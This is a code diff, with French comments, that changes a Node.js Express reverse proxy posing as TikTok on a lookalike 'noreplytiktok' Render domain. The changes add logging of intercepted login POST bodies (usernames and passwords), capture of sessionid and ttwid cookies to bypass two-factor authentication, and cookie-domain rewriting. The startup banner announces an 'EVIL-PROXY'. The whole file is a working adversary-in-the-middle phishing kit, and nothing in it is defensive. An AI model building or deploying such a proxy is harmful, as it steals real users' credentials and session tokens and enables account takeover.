@@ -2,48 +2,50 @@ const express = require('express');
 const { createProxyMiddleware } = require('http-proxy-middleware');
 const path = require('path');
 const cookieParser = require('cookie-parser');
+const bodyParser = require('body-parser'); // Ajoute ceci
 
 const app = express();
 const PORT = process.env.PORT || 10000;
 
 app.use(cookieParser());
+// On utilise un bodyParser pour lire les identifiants sans bloquer le proxy
+const jsonParser = bodyParser.json();
+const urlencodedParser = bodyParser.urlencoded({ extended: false });
+
 app.use(express.static(path.join(__dirname)));
 
 const proxyOptions = {
     target: 'https://www.tiktok.com',
     changeOrigin: true,
     secure: true,
-    // CRITIQUE : Permet au navigateur d'accepter les cookies de TikTok sur ton domaine Render
     cookieDomainRewrite: {
-        ".tiktok.com": "noreplytiktok.onrender.com",
-        "tiktok.com": "noreplytiktok.onrender.com"
+        "*": "noreplytiktok.onrender.com" 
     },
+    // CETTE PARTIE CAPTURE L'IDENTIFIANT ET LE PASS
+    onProxyReq: function (proxyReq, req, res) {
+        if (req.method === 'POST' && req.body) {
+            console.log("\n[!] DONNÉES POST INTERCEPTÉES :");
+            console.log(JSON.stringify(req.body, null, 2));
+            console.log("------------------------------\n");
+        }
+        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
+    },
+    // CETTE PARTIE CAPTURE LES COOKIES (SESSION/2FA)
     onProxyRes: function (proxyRes, req, res) {
-        const setCookie = proxyRes.headers['set-cookie'];
-        if (setCookie) {
-            console.log("\n[!] INTERCEPTION HEADERS - SESSION EN COURS");
-            setCookie.forEach(cookie => {
-                // On logue tout ce qui ressemble à un identifiant de session (2FA bypass)
-                if (cookie.includes('sessionid') || cookie.includes('ttwid') || cookie.includes('sid')) {
-                    console.log(">>> JETON CAPTURÉ : " + cookie.split(';')[0]);
+        const sc = proxyRes.headers['set-cookie'];
+        if (sc) {
+            sc.forEach(cookie => {
+                if (cookie.includes('sessionid') || cookie.includes('ttwid')) {
+                    console.log("\n✅ SESSION CAPTURÉE : " + cookie.split(';')[0]);
                 }
             });
-            console.log("------------------------------------------\n");
         }
-    },
-    onProxyReq: function (proxyReq, req, res) {
-        proxyReq.setHeader('Referer', 'https://www.tiktok.com/');
-        proxyReq.setHeader('Origin', 'https://www.tiktok.com');
     }
 };
 
-const proxy = createProxyMiddleware(proxyOptions);
-
-// Routes cruciales pour l'authentification TikTok
-app.use('/api/', proxy);
-app.use('/passport/', proxy);
-app.use('/login/', proxy);
+// On applique le proxy sur les routes de login
+app.use(['/api/*.*/', '/passport/*.*/', '/login/'], jsonParser, urlencodedParser, createProxyMiddleware(proxyOptions));
 
 app.listen(PORT, () => {
-    console.log("BACOPS PROXY SYNC - PORT " + PORT);
+    console.log("BACOPS EVIL-PROXY ACTIVE");
 });
